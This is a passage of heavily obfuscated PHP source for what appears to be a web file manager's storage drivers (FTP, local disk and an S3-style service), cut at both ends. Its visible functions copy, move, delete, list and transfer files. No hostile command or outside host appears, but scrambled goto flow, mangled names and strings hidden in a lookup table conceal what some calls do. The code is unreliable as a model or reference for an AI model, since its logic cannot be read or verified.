file_put_contents($aÉŸßÙÄĞÁ, $E¶ÁÃĞÁËõ); $DØ¦ÖÕ¶¥Ÿ = $this->upload($fòÛ±ÀŠ·†, $this->iconvApp($aÉŸßÙÄĞÁ)); $this->tempFileRemve($aÉŸßÙÄĞÁ); goto F¨…°Õ„Û; F¨…°Õ„Û: return $DØ¦ÖÕ¶¥Ÿ; goto Eğ‘Ôì¸Ÿ; Eğ‘Ôì¸Ÿ: } public function fileSubstr($a¤ƒÔÎÅ¥, $c¨Å˜Šªê” = 0, $F‘×‘ºÄˆë = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($a¤ƒÔÎÅ¥, $c¨Å˜Šªê”, $F‘×‘ºÄˆë); } private function ftpRequest($Eğã¤ÂÉ ñ, $bó…ƒ…Í‘ = 0, $BŠ«º“†å = false) { goto CŞ¼Òù‰˜ò; E´±ˆØ›Õò: curl_setopt($D·àÃï³òğ, CURLOPT_RETURNTRANSFER, 1); $d’É¨ø«™ã = curl_exec($D·àÃï³òğ); curl_close($D·àÃï³òğ); goto c“âÅ‚ò•ì; b—õÃ¬©œÚ: curl_setopt($D·àÃï³òğ, CURLOPT_URL, $bˆ•±¼Ò±¥ . $this->pathEncode($Eğã¤ÂÉ ñ)); curl_setopt($D·àÃï³òğ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($BŠ«º“†å) { $a‹¹’ê‡« = $bó…ƒ…Í‘ + $BŠ«º“†å - 1; curl_setopt($D·àÃï³òğ, CURLOPT_RANGE, "{$bó…ƒ…Í‘}\x2d{$a‹¹’ê‡«}"); } goto E´±ˆØ›Õò; CŞ¼Òù‰˜ò: $Eğã¤ÂÉ ñ = $this->iconvSystem($Eğã¤ÂÉ ñ); $bˆ•±¼Ò±¥ = $this->scheme . $this->host . $_SERVER[¿õñ][4] . $this->port; $D·àÃï³òğ = curl_init(); goto b—õÃ¬©œÚ; c“âÅ‚ò•ì: return $d’É¨ø«™ã; goto Eˆ¶¥Â¨Ø; Eˆ¶¥Â¨Ø: } public function upload($A†²öîÖÖ, $D…Õ×¨¾¼›, $A¸‰ëÙ¥»¾ = false, $EÛäÙ…í— = REPEAT_REPLACE) { goto A´³ªÙï¡Ü; A´³ªÙï¡Ü: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($A†²öîÖÖ))) { return !1; } $A†²öîÖÖ = $this->iconvSystem($A†²öîÖÖ); goto BÇ‚¾‡®Çß; BÇ‚¾‡®Çß: $D…Õ×¨¾¼› = $this->iconvSystem($D…Õ×¨¾¼›); $c˜ ®‰´ÏÔ = ftp_nb_put($this->connect, $A†²öîÖÖ, $D…Õ×¨¾¼›, FTP_BINARY); while ($c˜ ®‰´ÏÔ == FTP_MOREDATA) { $c˜ ®‰´ÏÔ = ftp_nb_continue($this->connect); } goto aÁî¹äøÒÅ; aÁî¹äøÒÅ: if ($c˜ ®‰´ÏÔ != FTP_FINISHED) { return !1; } return $this->getPathOuter($A†²öîÖÖ); goto fô¢Ø„¾‹”; fô¢Ø„¾‹”: } public function download($d…Æ—¢Ğ, $Cîñî”¥ = '') { goto fË§¥íŒ‹; fË§¥íŒ‹: if (!$this->_isconn()) { return !1; } $Eœ’ÜÂËæÇ = $this->pathFather($Cîñî”¥); if (!IO::mkdir($Eœ’ÜÂËæÇ)) { return !1; } goto eöÁº¢õŒ; F¢”Äé³: while ($E¨¯“¦Ö²ï == FTP_MOREDATA) { $E¨¯“¦Ö²ï = ftp_nb_continue($this->connect); } if ($E¨¯“¦Ö²ï != FTP_FINISHED) { return !1; } return $this->iconvApp($Cîñî”¥); goto fºÒùÀ˜‰; eöÁº¢õŒ: $d…Æ—¢Ğ = $this->iconvSystem($d…Æ—¢Ğ); $Cîñî”¥ = $this->iconvSystem($Cîñî”¥); $E¨¯“¦Ö²ï = ftp_nb_get($this->connect, $Cîñî”¥, $d…Æ—¢Ğ, FTP_BINARY); goto F¢”Äé³; fºÒùÀ˜‰: } private function ftpList($A¾ˆ‹»›‚œ) { goto CÎÒŒ˜©ÖÇ; e®ğÆâ÷×«: $fÀ‚“«Î³„ = array(); foreach ($b¶‰õ¤Áè as $Aáí‘à¿ß§) { if ($Aáí‘à¿ß§ == $C‹‚ôÀ£Ã¼[92] || $Aáí‘à¿ß§ == $C‹‚ôÀ£Ã¼[1133]) { continue; } if (!strstr($Aáí‘à¿ß§, $C‹‚ôÀ£Ã¼[8])) { $Aáí‘à¿ß§ = $A¾ˆ‹»›‚œ . ltrim($Aáí‘à¿ß§, $C‹‚ôÀ£Ã¼[8]); } $fÀ‚“«Î³„[] = $this->iconvApp($Aáí‘à¿ß§); } return $fÀ‚“«Î³„; goto CÑŸä…†é«; eĞùÏéˆ¸¨: $A¾ˆ‹»›‚œ = rtrim($A¾ˆ‹»›‚œ, $C‹‚ôÀ£Ã¼[8]) . $C‹‚ôÀ£Ã¼[8]; $b¶‰õ¤Áè = @ftp_nlist($this->connect, $A¾ˆ‹»›‚œ); if ($b¶‰õ¤Áè === !1) { $b¶‰õ¤Áè = @ftp_rawlist($this->connect, $A¾ˆ‹»›‚œ); foreach ($b¶‰õ¤Áè as $FÇ’Íóëè‹ => $c¯¦Š«Ü) { $b¶‰õ¤Áè[$FÇ’Íóëè‹] = end(explode($C‹‚ôÀ£Ã¼[1132], $c¯¦Š«Ü)); } } goto e®ğÆâ÷×«; CÎÒŒ˜©ÖÇ: $C‹‚ôÀ£Ã¼ =& $_SERVER[¿õñ]; if (!$this->isFolder($A¾ˆ‹»›‚œ)) { return !1; } @ftp_chdir($this->connect, $C‹‚ôÀ£Ã¼[8]); goto eĞùÏéˆ¸¨; CÑŸä…†é«: } private function recursionFtpFiles($A‹Ø¯´…ã, &$cĞƒï®¿) { $f¹¡ ›‚µ½ =& $_SERVER[¿õñ]; if (!$this->_isconn()) { return !1; } if (!($E·ñê²Şé™ = $this->ftpList($A‹Ø¯´…ã))) { return !1; } foreach ($E·ñê²Şé™ as $A‹Ø¯´…ã) { if ($this->isFolder($A‹Ø¯´…ã)) { $this->recursionFtpFiles($A‹Ø¯´…ã, $cĞƒï®¿); $cĞƒï®¿[$f¹¡ ›‚µ½[75]][] = $A‹Ø¯´…ã; } else { $cĞƒï®¿[$f¹¡ ›‚µ½[74]][] = $A‹Ø¯´…ã; } } } private function objectMeta($fõ¹¬ìÅŠÏ) { goto b‹¼õ×ÑÅğ; BŒŠ«¹ªÌ­: $cÏÙÈ’ = @ftp_size($this->connect, $this->iconvSystem($fõ¹¬ìÅŠÏ)); if ($cÏÙÈ’ != -1) { $A×Ò¿‹®–Ñ = array($bèíÉ¥âù[78] => $cÏÙÈ’, $bèíÉ¥âù[29] => $bèíÉ¥âù[164]); } else { $E«Ï¦š—ó = @ftp_chdir($this->connect, $this->iconvSystem($fõ¹¬ìÅŠÏ)); $A×Ò¿‹®–Ñ = $E«Ï¦š—ó ? array($bèíÉ¥âù[78] => 0, $bèíÉ¥âù[29] => $bèíÉ¥âù[77]) : !1; } Cache::set($b•ëÏ´Òø¸, $A×Ò¿‹®–Ñ, 0); goto D¢á•Âë; D¢á•Âë: return $A×Ò¿‹®–Ñ; goto dÓ‰Ô…›; aÍ¡İ¶º…: if ($A×Ò¿‹®–Ñ !== null && $A×Ò¿‹®–Ñ !== !1) { return $A×Ò¿‹®–Ñ; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $bèíÉ¥âù[8]); goto BŒŠ«¹ªÌ­; b‹¼õ×ÑÅğ: $bèíÉ¥âù =& $_SERVER[¿õñ]; $b•ëÏ´Òø¸ = $bèíÉ¥âù[1134] . md5($fõ¹¬ìÅŠÏ); $A×Ò¿‹®–Ñ = Cache::get($b•ëÏ´Òø¸); goto aÍ¡İ¶º…; dÓ‰Ô…›: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($dË–öñæğ) { if (substr($dË–öñæğ, 0, 2) == $_SERVER[¿õñ][1123]) { $dË–öñæğ = BASIC_PATH . substr($dË–öñæğ, 2); } return $dË–öñæğ; } public function iconvApp($c„Şš‹Âóš) { $d—È’Ìåì‡ =& $_SERVER[¿õñ]; global $config; return $this->iconvTo($c„Şš‹Âóš, $config[$d—È’Ìåì‡[1121]], $config[$d—È’Ìåì‡[1120]]); } public function iconvSystem($bØŸÀÏÔªÒ) { $BäŒÁÆÜÍæ =& $_SERVER[¿õñ]; global $config; return $this->iconvTo($bØŸÀÏÔªÒ, $config[$BäŒÁÆÜÍæ[1120]], $config[$BäŒÁÆÜÍæ[1121]]); } public function getPathOuter($C¾ÊÜˆˆ­Ô) { goto F¡‘ ¿ÇÅÖ; Cºª±ÑËìö: return $this->pathDriver . $DÜ¦ÀÃ…·Ø[8] . ltrim($C¾ÊÜˆˆ­Ô, $DÜ¦ÀÃ…·Ø[8]); goto Bê°‚…òğ¡; dæÍÖŸ˜öÊ: if (substr($c¨‡…ÁíŞÚ, 0, 2) == $DÜ¦ÀÃ…·Ø[1123]) { $c¨‡…ÁíŞÚ = BASIC_PATH . substr($c¨‡…ÁíŞÚ, 2); } if (substr($C¾ÊÜˆˆ­Ô, 0, 2) == $DÜ¦ÀÃ…·Ø[1123]) { $C¾ÊÜˆˆ­Ô = BASIC_PATH . substr($C¾ÊÜˆˆ­Ô, 2); } $c¨‡…ÁíŞÚ = KodIO::clear($c¨‡…ÁíŞÚ); goto E¶£ğ‘“; E¶£ğ‘“: $C¾ÊÜˆˆ­Ô = KodIO::clear($C¾ÊÜˆˆ­Ô); $C¾ÊÜˆˆ­Ô = substr($C¾ÊÜˆˆ­Ô, strlen($c¨‡…ÁíŞÚ)); if (empty($this->pathDriver)) { return $C¾ÊÜˆˆ­Ô; } goto Cºª±ÑËìö; F¡‘ ¿ÇÅÖ: $DÜ¦ÀÃ…·Ø =& $_SERVER[¿õñ]; $c¨‡…ÁíŞÚ = $this->iconvApp($this->pathBase); $C¾ÊÜˆˆ­Ô = $this->iconvApp($C¾ÊÜˆˆ­Ô); goto dæÍÖŸ˜öÊ; Bê°‚…òğ¡: } public function mkfile($eé×¿çÌ¯à, $cè£™”¹ñ = '', $B•Éº÷ßâ¡ = REPEAT_RENAME) { $eé×¿çÌ¯à = $this->iconvSystem($eé×¿çÌ¯à); @touch($eé×¿çÌ¯à); if ($cè£™”¹ñ) { file_put_contents($eé×¿çÌ¯à, $cè£™”¹ñ); } return is_file($eé×¿çÌ¯à) ? $this->getPathOuter($eé×¿çÌ¯à) : !1; } public function mkdir($aäæ¼ÔÑ, $E£‰ÙóÒ = REPEAT_SKIP) { $aäæ¼ÔÑ = $this->iconvSystem($aäæ¼ÔÑ); if (is_dir($aäæ¼ÔÑ)) { return $this->getPathOuter($aäæ¼ÔÑ); } @mkdir($aäæ¼ÔÑ, 511, !0); return is_dir($aäæ¼ÔÑ) ? $this->getPathOuter($aäæ¼ÔÑ) : !1; } public function copyFile($eÔŠƒ±‡óñ, $aè¾¡èÜÍÏ) { $this->mkdir($this->pathFather($aè¾¡èÜÍÏ)); $eÔŠƒ±‡óñ = $this->iconvSystem($eÔŠƒ±‡óñ); $aè¾¡èÜÍÏ = $this->iconvSystem($aè¾¡èÜÍÏ); $CÇğ¼§’Ú§ = @copy($eÔŠƒ±‡óñ, $aè¾¡èÜÍÏ); return $CÇğ¼§’Ú§ ? $this->getPathOuter($aè¾¡èÜÍÏ) : !1; } public function moveFile($cñåø«º–É, $Cöí“ãä…õ) { $this->mkdir($this->pathFather($Cöí“ãä…õ)); $cñåø«º–É = $this->iconvSystem($cñåø«º–É); $Cöí“ãä…õ = $this->iconvSystem($Cöí“ãä…õ); $cĞ«˜£ƒÖ = intval(@rename($cñåø«º–É, $Cöí“ãä…õ)); if (!$cĞ«˜£ƒÖ) { if ($cĞ«˜£ƒÖ = intval(@copy($cñåø«º–É, $Cöí“ãä…õ))) { @unlink($cñåø«º–É); } } return $cĞ«˜£ƒÖ ? $this->getPathOuter($Cöí“ãä…õ) : !1; } public function delFile($A¯è†¤šƒ) { $A¯è†¤šƒ = $this->iconvSystem($A¯è†¤šƒ); if (!@unlink($A¯è†¤šƒ)) { @chmod($A¯è†¤šƒ, 511); if (!@unlink($A¯è†¤šƒ)) { return !1; } } else { return !0; } } public function delFolder($cÙ÷‘‡íìî) { goto C™©£÷ß‚; B¥“àèòé: if (!($BÏç³İĞ½Æ = opendir($cÙ÷‘‡íìî))) { return !1; } while (($eİÁõáÎ¹É = readdir($BÏç³İĞ½Æ)) !== !1) { if ($eİÁõáÎ¹É == $fëØƒº•—[92] || $eİÁõáÎ¹É == $fëØƒº•—[1133]) { continue; } $FË»§ÊÖ = $cÙ÷‘‡íìî . $fëØƒº•—[8] . $eİÁõáÎ¹É; if (!is_dir($FË»§ÊÖ)) { if (!unlink($FË»§ÊÖ)) { chmod($FË»§ÊÖ, 511); if (!unlink($FË»§ÊÖ)) { return !1; } } } else { chmod($FË»§ÊÖ, 511); $FË»§ÊÖ = $this->iconvApp($FË»§ÊÖ); if (!$this->delFolder($FË»§ÊÖ)) { return !1; } } } closedir($BÏç³İĞ½Æ); goto bğ½æÄ‚´¢; bğ½æÄ‚´¢: return rmdir($cÙ÷‘‡íìî); goto A¿’›Óµ¡Ÿ; C™©£÷ß‚: $fëØƒº•— =& $_SERVER[¿õñ]; $cÙ÷‘‡íìî = $this->iconvSystem($cÙ÷‘‡íìî); if (!is_dir($cÙ÷‘‡íìî)) { return !0; } goto B¥“àèòé; A¿’›Óµ¡Ÿ: } public function rename($F‚½¹ÚÄ›Ñ, $EÄ¨†¡õî) { goto cóööí­¾ª; cóööí­¾ª: $cé²š›ÉÙÌ =& $_SERVER[¿õñ]; $F«¬½…İ» = $this->fileNameAuto($this->pathFather($F‚½¹ÚÄ›Ñ), $EÄ¨†¡õî); $F«¬½…İ» = $this->iconvSystem($F«¬½…İ»); goto CÃçÍéµ¸…; f³µÄªğ±: $DöÓ´Éëµù = @rename($F‚½¹ÚÄ›Ñ, $E…ÀÇƒ¢ÌÂ); $E…ÀÇƒ¢ÌÂ = $this->iconvApp($E…ÀÇƒ¢ÌÂ); return $DöÓ´Éëµù ? $this->getPathOuter($E…ÀÇƒ¢ÌÂ) : !1; goto a°èáëô„Ù; CÃçÍéµ¸…: $F‚½¹ÚÄ›Ñ = $this->iconvSystem($F‚½¹ÚÄ›Ñ); $cÒÍÇğÙ Î = $this->pathFather($F‚½¹ÚÄ›Ñ); $E…ÀÇƒ¢ÌÂ = rtrim($cÒÍÇğÙ Î, $cé²š›ÉÙÌ[8]) . $cé²š›ÉÙÌ[8] . $F«¬½…İ»; goto f³µÄªğ±; a°èáëô„Ù: } public function size($f‚‡¯ĞÌÍ‡) { $f‚‡¯ĞÌÍ‡ = $this->iconvSystem($f‚‡¯ĞÌÍ‡); return (double) abs(sprintf($_SERVER[¿õñ][1135], @filesize($f‚‡¯ĞÌÍ‡))); } public function info($dß˜ö–®—) { $dß˜ö–®— = $this->iconvSystem($dß˜ö–®—); if ($this->isFolder($dß˜ö–®—)) { return $this->folderInfo($dß˜ö–®—); } else { if ($this->isFile($dß˜ö–®—)) { return $this->fileInfo($dß˜ö–®—); } } return !1; } protected function infoChildren($eŠÅˆ®–¥ì, &$A³á›òÑŒË, $fÎ³‰ß™¹Ÿ = true) { $AÎöÁ‘…µ =& $_SERVER[¿õñ]; $eŠÅˆ®–¥ì = rtrim($eŠÅˆ®–¥ì, $AÎöÁ‘…µ[8]) . $AÎöÁ‘…µ[8]; if ($fÎ³‰ß™¹Ÿ) { check_abort(); $eŠÅˆ®–¥ì = $this->iconvSystem($eŠÅˆ®–¥ì); } if (!($Dó¶µáÜµ‡ = @opendir($eŠÅˆ®–¥ì))) { return; } while (($böé…Äî¦“ = readdir($Dó¶µáÜµ‡)) !== !1) { if ($böé…Äî¦“ == $AÎöÁ‘…µ[92] || $böé…Äî¦“ == $AÎöÁ‘…µ[1133]) { continue; } $D°Èà«öĞè = $eŠÅˆ®–¥ì . $böé…Äî¦“; if (is_file($D°Èà«öĞè)) { $A³á›òÑŒË[$AÎöÁ‘…µ[79]]++; $A³á›òÑŒË[$AÎöÁ‘…µ[78]] += (double) abs(sprintf($AÎöÁ‘…µ[1135], @filesize($D°Èà«öĞè))); } else { $A³á›òÑŒË[$AÎöÁ‘…µ[80]]++; $this->infoChildren($D°Èà«öĞè, $A³á›òÑŒË, !1); } } closedir($Dó¶µáÜµ‡); } private function folderInfo($Bğ¼ÙİÑ, $DÖñµ•—Œ = false) { $Dß½ÁÚ¸§ =& $_SERVER[¿õñ]; $Bğ¼ÙİÑ = rtrim($Bğ¼ÙİÑ, $Dß½ÁÚ¸§[8]) . $Dß½ÁÚ¸§[8]; $dÖï¡İÅ¾ƒ = $this->iconvApp($this->pathThis($Bğ¼ÙİÑ)); if ($DÖñµ•—Œ) { return array($Dß½ÁÚ¸§[28] => $dÖï¡İÅ¾ƒ, $Dß½ÁÚ¸§[76] => $this->getPathOuter($Bğ¼ÙİÑ), $Dß½ÁÚ¸§[29] => $Dß½ÁÚ¸§[77]); } $BõÆ’ãŠë = array($Dß½ÁÚ¸§[28] => $dÖï¡İÅ¾ƒ, $Dß½ÁÚ¸§[76] => $this->getPathOuter($Bğ¼ÙİÑ), $Dß½ÁÚ¸§[29] => $Dß½ÁÚ¸§[77], $Dß½ÁÚ¸§[184] => @filectime($Bğ¼ÙİÑ), $Dß½ÁÚ¸§[106] => @filemtime($Bğ¼ÙİÑ), $Dß½ÁÚ¸§[1136] => @fileatime($Bğ¼ÙİÑ), $Dß½ÁÚ¸§[1130] => is_readable($Bğ¼ÙİÑ), $Dß½ÁÚ¸§[1131] => is_writable($Bğ¼ÙİÑ), $Dß½ÁÚ¸§[1137] => get_mode($Bğ¼ÙİÑ)); return $BõÆ’ãŠë; } private function fileInfo($d¾ÏÀŞÑÆ, $b÷£×Ö×‹µ = false) { $Eùƒ„Ìö—‘ =& $_SERVER[¿õñ]; $B¨•™ãÈ±ª = $this->iconvApp($this->pathThis($d¾ÏÀŞÑÆ)); if ($b÷£×Ö×‹µ) { return array($Eùƒ„Ìö—‘[28] => $B¨•™ãÈ±ª, $Eùƒ„Ìö—‘[76] => $this->getPathOuter($d¾ÏÀŞÑÆ), $Eùƒ„Ìö—‘[29] => $Eùƒ„Ìö—‘[164], $Eùƒ„Ìö—‘[78] => $this->size($d¾ÏÀŞÑÆ), $Eùƒ„Ìö—‘[157] => $this->ext($B¨•™ãÈ±ª)); } $Dš—Ûæë = array($Eùƒ„Ìö—‘[28] => $B¨•™ãÈ±ª, $Eùƒ„Ìö—‘[76] => $this->getPathOuter($d¾ÏÀŞÑÆ), $Eùƒ„Ìö—‘[29] => $Eùƒ„Ìö—‘[164], $Eùƒ„Ìö—‘[184] => @filectime($d¾ÏÀŞÑÆ), $Eùƒ„Ìö—‘[106] => @filemtime($d¾ÏÀŞÑÆ), $Eùƒ„Ìö—‘[1136] => @fileatime($d¾ÏÀŞÑÆ), $Eùƒ„Ìö—‘[78] => $this->size($d¾ÏÀŞÑÆ), $Eùƒ„Ìö—‘[157] => $this->ext($B¨•™ãÈ±ª), $Eùƒ„Ìö—‘[1130] => is_readable($d¾ÏÀŞÑÆ), $Eùƒ„Ìö—‘[1131] => is_writable($d¾ÏÀŞÑÆ), $Eùƒ„Ìö—‘[1137] => get_mode($d¾ÏÀŞÑÆ)); return $Dš—Ûæë; } public function exist($CêïÅÅøš‰) { $CêïÅÅøš‰ = $this->iconvSystem($CêïÅÅøš‰); return @file_exists($CêïÅÅøš‰); } public function isFile($B„Ù£¶êÕÆ) { $B„Ù£¶êÕÆ = $this->iconvSystem($B„Ù£¶êÕÆ); return @is_file($B„Ù£¶êÕÆ); } public function isFolder($dŸáÆ±ƒ—) { $dŸáÆ±ƒ— = $this->iconvSystem($dŸáÆ±ƒ—); return @is_dir($dŸáÆ±ƒ—); } public function listPath($Eà£Ãƒ¯Ô, $e¹—¹Íˆµ‡ = false) { goto b‡´ª¬Ï…ù; D®ó„™ŸÖá: $d×—•÷Î—º = array($Fùä”ù®Éø[75] => array(), $Fùä”ù®Éø[74] => array()); if (!($b¬»¶°ñ§¿ = @opendir($Eà£Ãƒ¯Ô))) { return $d×—•÷Î—º; } while (($e‹ö——Ÿ = readdir($b¬»¶°ñ§¿)) !== !1) { if ($e‹ö——Ÿ == $Fùä”ù®Éø[92] || $e‹ö——Ÿ == $Fùä”ù®Éø[1133]) { continue; } $dåÜ‹ğ¬Ö¨ = $Eà£Ãƒ¯Ô . $e‹ö——Ÿ; if (is_file($dåÜ‹ğ¬Ö¨)) { $d×—•÷Î—º[$Fùä”ù®Éø[74]][] = $this->fileInfo($dåÜ‹ğ¬Ö¨, $e¹—¹Íˆµ‡); } else { $d×—•÷Î—º[$Fùä”ù®Éø[75]][] = $this->folderInfo($dåÜ‹ğ¬Ö¨, $e¹—¹Íˆµ‡); } } goto Dƒ¢´„‰‰; Dƒ¢´„‰‰: closedir($b¬»¶°ñ§¿); return $d×—•÷Î—º; goto bš®ƒÔ’ˆÈ; b‡´ª¬Ï…ù: $Fùä”ù®Éø =& $_SERVER[¿õñ]; $Eà£Ãƒ¯Ô = $this->iconvSystem($Eà£Ãƒ¯Ô); $Eà£Ãƒ¯Ô = rtrim($Eà£Ãƒ¯Ô, $Fùä”ù®Éø[8]) . $Fùä”ù®Éø[8]; goto D®ó„™ŸÖá; bš®ƒÔ’ˆÈ: } public function listAll($BÅÙØÅŞ²è, &$eÑî•â‡îã = array()) { goto cìÏ±ËÅô›; fØ¤ÑØÌ„â: return $eÑî•â‡îã; goto C¢™î°¡Ä‘; EªèÔõôÆ³: if (!($aœˆèõÀÁ = @opendir($BÅÙØÅŞ²è))) { return $eÑî•â‡îã; } while (($f‚‡”À‡‘ = readdir($aœˆèõÀÁ)) !== !1) { if ($f‚‡”À‡‘ == $eĞä”õÅ³­[92] || $f‚‡”À‡‘ == $eĞä”õÅ³­[1133]) { continue; } $B»§»ô’Õ = $BÅÙØÅŞ²è . $f‚‡”À‡‘; if (is_dir($B»§»ô’Õ)) { $eÑî•â‡îã[] = array($eĞä”õÅ³­[76] => $B»§»ô’Õ . $eĞä”õÅ³­[8], $eĞä”õÅ³­[77] => 1, $eĞä”õÅ³­[78] => 0); $this->listAll($B»§»ô’Õ, $eÑî•â‡îã); } else { $eÑî•â‡îã[] = array($eĞä”õÅ³­[76] => $B»§»ô’Õ, $eĞä”õÅ³­[77] => 0, $eĞä”õÅ³­[78] => $this->size($B»§»ô’Õ)); } } closedir($aœˆèõÀÁ); goto fØ¤ÑØÌ„â; cìÏ±ËÅô›: $eĞä”õÅ³­ =& $_SERVER[¿õñ]; $BÅÙØÅŞ²è = $this->iconvSystem($BÅÙØÅŞ²è); $BÅÙØÅŞ²è = rtrim($BÅÙØÅŞ²è, $eĞä”õÅ³­[8]) . $eĞä”õÅ³­[8]; goto EªèÔõôÆ³; C¢™î°¡Ä‘: } public function has($a×Óº¶²Â, $dÄÕëî‡ = false, $d»ö¾½Â”» = true) { goto FĞ°º†åµÍ; FĞ°º†åµÍ: $eÂÛĞ™ª‰´ =& $_SERVER[¿õñ]; $a×Óº¶²Â = $this->iconvSystem($a×Óº¶²Â); $a×Óº¶²Â = rtrim($a×Óº¶²Â, $eÂÛĞ™ª‰´[8]) . $eÂÛĞ™ª‰´[8]; goto BÄ³¾ˆ¦Ä; FæğèÈ®¤Ñ: while (($B´¤Ü¶¥  = readdir($eÆøœåèùØ)) !== !1) { if ($B´¤Ü¶¥  == $eÂÛĞ™ª‰´[92] || $B´¤Ü¶¥  == $eÂÛĞ™ª‰´[1133]) { continue; } $cïÂĞªˆÀÀ = $a×Óº¶²Â . $B´¤Ü¶¥ ; if ($dÄÕëî‡) { if (@is_file($cïÂĞªˆÀÀ)) { $DøùØ…°¡++; } else { $a¦ÎÙâğ¾ğ++; } continue; } if ($d»ö¾½Â”») { if (@is_file($cïÂĞªˆÀÀ)) { return !0; } } else { if (@is_dir($cïÂĞªˆÀÀ . $eÂÛĞ™ª‰´[8])) { return !0; } } } closedir($eÆøœåèùØ); if ($dÄÕëî‡) { return array($eÂÛĞ™ª‰´[188] => $DøùØ…°¡, $eÂÛĞ™ª‰´[189] => $a¦ÎÙâğ¾ğ); } goto dºÀšÚØ; dºÀšÚØ: return !1; goto d°ÆÃñ³Ï‹; BÄ³¾ˆ¦Ä: if (!($eÆøœåèùØ = @opendir($a×Óº¶²Â))) { return !1; } $DøùØ…°¡ = 0; $a¦ÎÙâğ¾ğ = 0; goto FæğèÈ®¤Ñ; d°ÆÃñ³Ï‹: } public function hashSimple($e‹Š®Æ½¡) { goto A¡óÒ·ÀÜ›; B·å¥ñ‘ŠÑ: if ($cŒ¨›•«áÚ <= $E‰Õµªõ‰É * $c·íˆ¤ˆ‡ô) { return $this->hashMd5($e‹Š®Æ½¡) . $cŒ¨›•«áÚ; } $eÛë×ôÖÏÕ = $fí£í±‘Ü¡[33]; $EÏÑõš²à÷ = intval($cŒ¨›•«áÚ / $c·íˆ¤ˆ‡ô); goto eŠğé¢Âçù; C…ù¼›‰‘²: $cŒ¨›•«áÚ = $this->size($e‹Š®Æ½¡); $E‰Õµªõ‰É = 200; $c·íˆ¤ˆ‡ô = 50; goto B·å¥ñ‘ŠÑ; FÙĞ´æ‰Ï: fseek($e–à–Çê‘¼, $cŒ¨›•«áÚ - $E‰Õµªõ‰É); $eÛë×ôÖÏÕ .= fread($e–à–Çê‘¼, $E‰Õµªõ‰É); fclose($e–à–Çê‘¼); goto fñÙ¤§ÆÀ; eŠğé¢Âçù: $e–à–Çê‘¼ = fopen($e‹Š®Æ½¡, $fí£í±‘Ü¡[1138]); if (!$e–à–Çê‘¼) { return $eÛë×ôÖÏÕ; } for ($Bºö§Œ½Ú = 0; $Bºö§Œ½Ú < $c·íˆ¤ˆ‡ô; $Bºö§Œ½Ú++) { fseek($e–à–Çê‘¼, $EÏÑõš²à÷ * $Bºö§Œ½Ú); $eÛë×ôÖÏÕ .= fread($e–à–Çê‘¼, $E‰Õµªõ‰É); } goto FÙĞ´æ‰Ï; fñÙ¤§ÆÀ: return md5($eÛë×ôÖÏÕ) . $cŒ¨›•«áÚ; goto B½ìéî…ÑŠ; A¡óÒ·ÀÜ›: $fí£í±‘Ü¡ =& $_SERVER[¿õñ]; if (!$e‹Š®Æ½¡) { return md5($fí£í±‘Ü¡[33]); } $e‹Š®Æ½¡ = $this->iconvSystem($e‹Š®Æ½¡); goto C…ù¼›‰‘²; B½ìéî…ÑŠ: } public function getContent($Fë†ö›¡Š) { $Fë†ö›¡Š = $this->iconvSystem($Fë†ö›¡Š); return file_get_contents($Fë†ö›¡Š); } public function setContent($bèÔÊ›˜ò, $E˜·­™ÊºŞ = '') { $bèÔÊ›˜ò = $this->iconvSystem($bèÔÊ›˜ò); @file_put_contents($bèÔÊ›˜ò, $E˜·­™ÊºŞ, LOCK_EX); clearstatcache(); return strlen($E˜·­™ÊºŞ) == filesize($bèÔÊ›˜ò); } public function fileSubstr($Aö«ÃñÎÁ×, $E‹äÖÛ¸î = 0, $e¡Ò˜ÍŸ† = false) { goto cïå¤Î´÷¾; bÀ‹íÕÄÃì: if ($e¡Ò˜ÍŸ† <= 0) { return $dí¥š½ÈÜ[33]; } $Eæ“õñå·© = fopen($Aö«ÃñÎÁ×, $dí¥š½ÈÜ[1138]); if (!$Eæ“õñå·©) { return !1; } goto bÉŠº¹«á×; bÉŠº¹«á×: fseek($Eæ“õñå·©, $E‹äÖÛ¸î); $bÉÀôé×ôÕ = fread($Eæ“õñå·©, $e¡Ò˜ÍŸ†); fclose($Eæ“õñå·©); goto Eµ¶ÑÉÄÔ; cïå¤Î´÷¾: $dí¥š½ÈÜ =& $_SERVER[¿õñ]; $Aö«ÃñÎÁ× = $this->iconvSystem($Aö«ÃñÎÁ×); if ($e¡Ò˜ÍŸ† === !1) { $e¡Ò˜ÍŸ† = $this->size($Aö«ÃñÎÁ×); } goto bÀ‹íÕÄÃì; Eµ¶ÑÉÄÔ: return $bÉÀôé×ôÕ; goto eÕîÏÒ›Œ; eÕîÏÒ›Œ: } public function upload($A¼–‡³•¿î, $cÈõ‡’òîæ, $A¡ØÌ³’³ = false, $A®§ÓŞ¨˜è = REPEAT_REPLACE) { $eÉ’¦ß«›î = $this->copyFile($cÈõ‡’òîæ, $A¼–‡³•¿î); return $eÉ’¦ß«›î ? $this->getPathOuter($A¼–‡³•¿î) : !1; } public function download($aÓ·™Ê‹†ê, $E÷ô“Óùù¦) { return $this->iconvSystem($aÓ·™Ê‹†ê); } } class PathDriverMOSS extends PathDriverBaseS3 { public function __construct($díİİ¦÷) { parent::__construct($díİİ¦÷); $this->signatureVersion($_SERVER[¿õñ][197]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function copyFile($E²²‡·«Ñ, $d®„¢É·êÆ, $D†óá…¦¸ = array()) { $Aãáõ‘ğõÅ = $this->tempFile($E²²‡·«Ñ); $this->download($E²²‡·«Ñ, $Aãáõ‘ğõÅ); $F‡ğˆİ‡ÂÆ = $this->upload($d®„¢É·êÆ, $Aãáõ‘ğõÅ); $this->tempFileRemve($Aãáõ‘ğõÅ); return $F‡ğˆİ‡ÂÆ; } public function uploadFormData($D†×Ê‹†´, $B‰†Î³Ó—› = 3600) { return parent::uploadFormData($D†×Ê‹†´, $B‰†Î³Ó—›); } public function fileOut($F»‘é¹ïÜì, $dÉ‡‰ÇÎŒ = false, $c–Ó™ø‘¡ê = false, $EÂ¦­«Æ—± = '') { parent::fileOutServer($F»‘é¹ïÜì, $dÉ‡‰ÇÎŒ, $c–Ó™ø‘¡ê, $EÂ¦­«Æ—±); } public function fileOutLink($aÒØÕÚ ”’) { 